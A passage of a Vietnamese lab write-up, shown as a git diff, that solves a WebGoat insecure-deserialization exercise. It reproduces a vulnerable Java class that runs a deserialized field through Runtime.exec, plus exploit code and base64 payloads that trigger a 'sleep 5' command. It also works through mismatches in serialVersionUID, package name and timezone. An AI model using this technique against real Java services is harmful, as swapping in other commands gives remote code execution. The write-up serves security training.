@@ -207,12 +207,188 @@ Mở Admin panel và xóa `Carlos` user.
 > Solved!
 
 
-
-
-
-
 ## Câu 10
 > Đã làm tại lớp  
 
 ## Câu 11
+### Description
+The following input box receives a serialized object (a string) and it deserialzes it.
+```
+rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l
+```
+Try to change this serialized object in order to delay the page response for exactly 5 seconds.
+
+### Solution
+Đầu tiên, khi thử copy chuỗi trên và submit, ta có feedback sau:  
+
+![image](https://user-images.githubusercontent.com/44528004/137867551-a10b5d02-099e-41ca-88b7-d4c69a58b5e9.png)  
+
+Nhận thấy được là chương trình này sẽ deserialize và tạo `VulnerableTaskHolder` object. Và khi nhắc đến `VulnerableTaskHolder`, ta xem lại lesson 3:  
+```java
+package org.dummy.insecure.framework;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.ObjectInputStream;
+import java.io.Serializable;
+import java.time.LocalDateTime;
+
+public class VulnerableTaskHolder implements Serializable {
+
+        private static final long serialVersionUID = 1;
+
+        private String taskName;
+        private String taskAction;
+        private LocalDateTime requestedExecutionTime;
+
+        public VulnerableTaskHolder(String taskName, String taskAction) {
+                super();
+                this.taskName = taskName;
+                this.taskAction = taskAction;
+                this.requestedExecutionTime = LocalDateTime.now();
+        }
+
+        private void readObject( ObjectInputStream stream ) throws Exception {
+        //deserialize data so taskName and taskAction are available
+                stream.defaultReadObject();
+
+                //blindly run some code. #code injection
+                Runtime.getRuntime().exec(taskAction);
+     }
+}
+```
+
+Dựa vào các câu 7, mình dựng lại code để exploit sau:
+```java
+// Exploit.java
+import java.io.*;
+import java.util.*;
+import java.time.LocalDateTime;
+
+public class Exploit {
+
+    public static void main(String[] args) throws Exception {
+        VulnerableTaskHolder vulTask = new VulnerableTaskHolder("sleep for 5 seconds", "sleep 5");
+        ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
+        ObjectOutputStream objStream = new ObjectOutputStream(byteStream);
+        objStream.writeObject(vulTask);
+        objStream.flush();
+        byte[] exploit = byteStream.toByteArray();
+        System.out.println(Base64.getEncoder().encodeToString(exploit));
+    }
+}
+
+class VulnerableTaskHolder implements Serializable {
+
+        private static final long serialVersionUID = 1;
+
+        private String taskName;
+        private String taskAction;
+        private LocalDateTime requestedExecutionTime;
+
+        public VulnerableTaskHolder(String taskName, String taskAction) {
+                super();
+                this.taskName = taskName;
+                this.taskAction = taskAction;
+                this.requestedExecutionTime = LocalDateTime.now();
+        }
+
+        private void readObject( ObjectInputStream stream ) throws Exception {
+        //deserialize data so taskName and taskAction are available
+                stream.defaultReadObject();
+
+                //blindly run some code. #code injection
+                Runtime.getRuntime().exec(taskAction);
+     }
+}
+```
+
+Compile và chạy chương trình:
+```
+javac Exploit.java
+java Exploit
+```
+
+Mình có token sau:
+```
+rO0ABXNyABRWdWxuZXJhYmxlVGFza0hvbGRlcgAAAAAAAAABAgADTAAWcmVxdWVzdGVkRXhlY3V0aW9uVGltZXQAGUxqYXZhL3RpbWUvTG9jYWxEYXRlVGltZTtMAAp0YXNrQWN0aW9udAASTGphdmEvbGFuZy9TdHJpbmc7TAAIdGFza05hbWVxAH4AAnhwc3IADWphdmEudGltZS5TZXKVXYS6GyJIsgwAAHhwdw4FAAAH5QoTEBMmCOXwPHh0AAdzbGVlcCA1dAATc2xlZXAgZm9yIDUgc2Vjb25kcw==
+```
+
+Tuy nhiên khi submit thì mình gặp feedback sau:  
+
+![image](https://user-images.githubusercontent.com/44528004/137881345-f7321c73-c650-4a08-90dd-ca2eeaaaa5cb.png)
+
+Sau khi tìm hiểu, thì cách fix lỗi này của mình như sau:  
+- Thứ nhất, trong đoạn code `VulnerableTaskHolder` của chính WebGoat, `serialVersionUID = 2` còn đoạn code của mình thì bằng `1`. Do đó mình sửa giá trị này thành 2.  
+- Thứ 2, class `VulnerableTaskHolder` của mình khi được compile ra sẽ khác với class `VulnerableTaskHolder` của WebGoat vì class của họ được đóng gói trong package `org.dummy.insecure.framework`. Chính vì vậy, mình đã khắc phục bằng cách clone source của WebGoat về, tạo file `Exploit.java` tại path `WebGoat/webgoat-lessons/insecure-deserialization/src/main/java` bởi vì thư mục này là điểm bắt đầu của package `org.dummy.insecure.framework`. `Exploit.java` mới của mình như sau:  
+
+```java
+import org.dummy.insecure.framework.*;
+import java.io.*;
+import java.util.*;
+import java.time.LocalDateTime;
+
+public class Exploit {
+
+    public static void main(String[] args) throws Exception {
+        VulnerableTaskHolder vulTask = new VulnerableTaskHolder("sleep for 5 seconds", "sleep 5");
+        ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
+        ObjectOutputStream objStream = new ObjectOutputStream(byteStream);
+        objStream.writeObject(vulTask);
+        objStream.flush();
+        byte[] exploit = byteStream.toByteArray();
+        System.out.println(Base64.getEncoder().encodeToString(exploit));
+    }
+}
+```
+
+Ở đây, đoạn code exploit này sẽ sử dụng trực tiếp class `VulnerableTaskHolder` từ package `org.dummy.insecure.framework` của WebGoat, do đó lỗi `serialization id does not match` sẽ được khắc phục.  
+
+Compile và chạy exploit:  
+```
+javac Exploit.java
+java Exploit
+```
+
+Kết quả:  
+
+![image](https://user-images.githubusercontent.com/44528004/137882912-88b97c88-81cf-455b-b32f-39b50340701a.png)
+
+Khi xem đoạn code của class `VulnerableTaskHolder`, có một thuộc tính `requestedExecutionTime` được tính từ thời gian hiện tại của runtime. Lúc này, máy mình có timezone là `Asia/Ho_Chi_Minh`.  
+
+```
+└─$ timedatectl
+               Local time: Tue 2021-10-19 16:31:03 +07
+           Universal time: Tue 2021-10-19 09:31:03 UTC
+                 RTC time: Tue 2021-10-19 09:31:03
+                Time zone: Asia/Ho_Chi_Minh (+07, +0700)
+System clock synchronized: yes
+              NTP service: n/a
+          RTC in local TZ: no
+```
+
+Trong khi docker WebGoat được chạy với timezone là `Europe/Amsterdam`. Do đó, minh sẽ sửa nhanh timezone trên máy tạo payload thành `Europe/Amsterdam`.
+```
+└─$ sudo timedatectl set-timezone Europe/Amsterdam
+└─$ timedatectl
+               Local time: Tue 2021-10-19 11:33:29 CEST
+           Universal time: Tue 2021-10-19 09:33:29 UTC
+                 RTC time: Tue 2021-10-19 09:33:29
+                Time zone: Europe/Amsterdam (CEST, +0200)
+System clock synchronized: yes
+              NTP service: n/a
+          RTC in local TZ: no
+```
+
+Compile và chạy lại Exploit ta được payload sau:  
+```
+rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiyDAAAeHB3DgUAAAflChMLIgcLynvXeHQAB3NsZWVwIDV0ABNzbGVlcCBmb3IgNSBzZWNvbmRz
+```
+
+Kết quả submit:  
+
+![image](https://user-images.githubusercontent.com/44528004/137883739-0506505a-5d08-4680-8b99-5bf4e29a7b87.png)
+> Thành công!
+
 
